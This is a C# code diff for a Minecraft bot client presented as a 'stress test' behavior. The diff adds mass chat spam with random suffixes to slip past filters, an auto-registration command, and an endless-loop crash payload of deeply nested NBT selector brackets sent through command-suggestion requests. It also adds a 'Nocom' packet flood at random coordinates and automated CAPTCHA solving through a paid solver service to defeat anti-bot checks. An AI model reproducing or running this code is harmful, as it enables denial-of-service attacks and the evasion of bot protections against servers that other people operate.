@@ -1,5 +1,7 @@
-﻿using System.Collections.Concurrent;
+﻿using System.Buffers;
+using System.Collections.Concurrent;
 using System.ComponentModel;
+using System.Diagnostics;
 using System.Reactive.Disposables;
 using System.Reactive.Linq;
 using System.Text.RegularExpressions;
@@ -8,9 +10,16 @@ using McProtoNet;
 using McProtoNet.Abstractions;
 using McProtoNet.MultiVersionProtocol;
 using McProtoNet.Net;
+using McProtoNet.Protocol;
 using McProtoNet.Protocol754;
 using ReactiveUI;
 using Serilog;
+using SixLabors.ImageSharp;
+using SixLabors.ImageSharp.Formats.Png;
+using SixLabors.ImageSharp.PixelFormats;
+using SixLabors.ImageSharp.Processing;
+using Zennolab.CapMonsterCloud;
+using Zennolab.CapMonsterCloud.Requests;
 
 namespace HolyClient.StressTest;
 
@@ -19,10 +28,22 @@ public class DefaultBehavior : BaseStressTestBehavior
     private static Regex SayVerifyRegex = new(@"\.say \/verify (\d+)");
 
     private IObservable<long> StaticSpam;
+    [DisplayName("Spam Enable")] public bool SpamEnable { get; set; } = true;
 
-    [DisplayName("Spam text")] public string SpamText { get; set; } = "!Spam Spam Spam";
+    [DisplayName("Spam text")]
+    public BindingList<string> SpamTexts { get; set; } = new BindingList<string>
+    {
+        "!Hello from Minecraft Holy CLient"
+    };
+
+    [DisplayName("Fisrt text send")]
+    public BindingList<string> FirstText { get; set; } = new()
+    {
+        "/register 21qwerty 21qwerty"
+    };
 
     [DisplayName("Spam timeout")] public int SpamTimeout { get; set; } = 1000;
+    [DisplayName("Start bot timeout")] public int StartTimeout { get; set; } = 100;
 
     [DisplayName("Reconnect timeout")] public int ReconnectTimeout { get; set; } = 5000;
 
@@ -30,50 +51,229 @@ public class DefaultBehavior : BaseStressTestBehavior
 
     [DisplayName("Spam Nocom")] public bool SpamNocom { get; set; } = false;
 
+    [DisplayName("Crash Completion")] public bool CrashCompletion { get; set; } = false;
+
+
+    private ILogger _logger;
+    private ICapMonsterCloudClient _capMonsterClient;
+
+    public DefaultBehavior()
+    {
+        
+    }
     public override Task Activate(CompositeDisposable disposables, IEnumerable<IStressTestBot> bots, ILogger logger,
         CancellationToken cancellationToken)
     {
-        logger.Information("Start default behavior");
-        foreach (var bot in bots)
-        {
-            bot.ConfigureAutoRestart(AutoRestartAction);
-            MultiProtocol proto = bot.Protocol as MultiProtocol;
+        var spams = SpamTexts.ToArray();
+        var first = FirstText.ToArray();
+        
+        
+        string env = Environment.GetEnvironmentVariable("CapMonsterKey", EnvironmentVariableTarget.User);
 
-            proto.OnLogin.Subscribe(async x =>
+
+        var clientOptions = new ClientOptions
+        {
+            ClientKey = env
+        };
+        Directory.CreateDirectory("captches");
+        _capMonsterClient = CapMonsterCloudClientFactory.Create(clientOptions);
+
+
+        _logger = logger;
+        logger.Information("Start default behavior");
+        
+        Task.Run(async () =>
+        {
+            foreach (var bot in bots)
             {
-                try
+                bot.ConfigureAutoRestart(AutoRestartAction);
+
+                MultiProtocol proto = bot.Protocol as MultiProtocol;
+
+                proto.OnLogin.Subscribe(async x =>
                 {
-                    await Task.Delay(2000);
-                    await proto.SendChatPacket("/register 21qwerty 21qwerty");
-                    CancellationTokenSource cts = new CancellationTokenSource();
-                    Disposable.Create(() =>
+                    try
                     {
-                        try
+                        await proto.SendClientInformation("ru", 16, 0, true, 127, 1, true, true);
+
+                        foreach (var item in first)
                         {
-                            cts.Cancel();
+                            await proto.SendChatPacket(item);
+                            await Task.Delay(500);
                         }
-                        finally
+                        
+                        if (SpamNocom)
                         {
-                            cts.Dispose();
+                            NocomEnable(proto);
                         }
-                    }).DisposeWith(disposables);
-                    
-                    while (!cts.IsCancellationRequested)
-                    {
-                        await proto.SendChatPacket(SpamText);
-                        await Task.Delay(SpamTimeout, cts.Token);
+
+                        if (CrashCompletion)
+                        {
+                            Crashing(proto);
+                        }
+                        
+                        if (!SpamEnable)
+                            return;
+                        
+                        
+
+                        
+
+                        CancellationTokenSource cts = new CancellationTokenSource();
+                        Disposable.Create(() =>
+                        {
+                            try
+                            {
+                                cts.Cancel();
+                            }
+                            finally
+                            {
+                                cts.Dispose();
+                            }
+                        }).DisposeWith(disposables);
+                        Random r = new();
+                        
+                        while (!cts.IsCancellationRequested)
+                        {
+                            string spamText = spams[r.Next(0, spams.Length)];
+                            await proto.SendChatPacket($"{spamText} {r.Next(0,100):D3}" );
+                            await Task.Delay(SpamTimeout, cts.Token);
+                        }
                     }
-                }
-                catch
+                    catch (Exception exception)
+                    {
+                        //Console.WriteLine("Spam err: " + exception.Message);
+                        // ignored
+                    }
+                }).DisposeWith(disposables);
+
+                proto.OnMapItemData.Subscribe(OnMapItem).DisposeWith(disposables);
+
+                proto.OnPosition.FirstAsync().Subscribe(async p =>
                 {
-                    // ignored
-                }
-            }).DisposeWith(disposables);
-            bot.Restart(true);
-        }
+                    try
+                    {
+                        await proto.SendPositionLook(p.X, p.Y, p.Z, p.Yaw, p.Pitch, false);
+                        await proto.SendTeleportConfirm(p.TeleportId);
+                    }
+                    catch
+                    {
+                    }
+                }).DisposeWith(disposables);
+                if (StartTimeout > 0)
+                    await Task.Delay(StartTimeout);
+                bot.Restart(true);
+            }
+        });
 
         return Task.CompletedTask;
     }
+    private static string generateJsonObject(int levels) {
+        String ins = string.Join("", Enumerable.Range(0, levels)
+                .Select(i => "["))
+            ;
+        return "{a:" + ins + "}";
+    }
+    private static int length = 2032;
+    static DefaultBehavior()
+    {
+        string overflow = generateJsonObject(length);
+        string message = "msg @a[nbt={PAYLOAD}]";
+        string partialCommand = message.Replace("{PAYLOAD}", overflow);
+        crashCommand = partialCommand;
+    }
+    private static string crashCommand;
+    private void Crashing(MultiProtocol proto)
+    {
+        Task.Run(async () =>
+        {
+            try
+            {
+                await Task.Delay(1000);
+                while (true)
+                {
+                    await proto.SendCommandSuggestionsRequest(0, crashCommand, false, null);
+                    //await Task.Delay(100);
+                }
+            }
+            catch (Exception ex)
+            {
+                //_logger.Warning(ex.Message);
+            }
+        });
+    }
+
+    private async void NocomEnable(MultiProtocol bot)
+    {
+        try
+        {
+            Random r = new Random();
+            await Task.Delay(1000);
+            int sec = 0;
+            while (true)
+            {
+                Position loc = new Position(r.Next(-100_000, 100_000), r.Next(0, 255), r.Next(-100_000, 100_000));
+                await bot.SendPlayerAction(0, loc, 0, sec++);
+                await Task.Delay(100);
+            }
+        }
+        catch (Exception ex)
+        {
+            //_logger.Warning(ex.Message);
+        }
+    }
+
+    private async void OnMapItem(MapItemDataPacket packet)
+    {
+        try
+        {
+            if (packet.Data is not null)
+            {
+                int columns = packet.Data.Columns;
+                int rows = packet.Data.Rows;
+                using (Image<Rgba32> image = new Image<Rgba32>(columns, rows))
+                {
+                    for (int row = 0; row < rows; row++)
+                    {
+                        for (int column = 0; column < columns; column++)
+                        {
+                            int id = column + row * 128;
+                            uint rgba = (uint)MapColor.getColorFromPackedId(packet.Data.Data[id]);
+                            image[column, row] = new Rgba32(rgba);
+                        }
+                    }
+
+
+                    string base64 = image.ToBase64String(PngFormat.Instance);
+
+                    ImageToTextRequest request = new ImageToTextRequest
+                    {
+                        Body = base64,
+                        Numeric = true
+                    };
+                    try
+                    {
+                        var result = await _capMonsterClient.SolveAsync(request).ConfigureAwait(false);
+                        string val = result.Solution.Value;
+                        string path = Path.Combine("captches", $"{val}__{Stopwatch.GetTimestamp()}.png");
+
+                        await image.SaveAsPngAsync(path).ConfigureAwait(false);
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e);
+                    }
+                }
+            }
+        }
+        catch (Exception e)
+        {
+            _logger.Warning(e, "Ошибка обработки каптчи");
+            Console.WriteLine(e);
+            //throw;
+        }
+    }
+
 
     private async void AutoRestartAction(IStressTestBot b)
     {
